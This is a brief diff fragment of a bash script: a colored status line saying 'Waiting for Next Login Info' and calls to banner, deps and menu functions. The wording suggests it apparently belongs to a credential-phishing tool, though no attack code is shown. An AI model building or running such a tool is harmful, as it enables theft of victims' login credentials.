+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+}
+banner
+deps
+menu
+
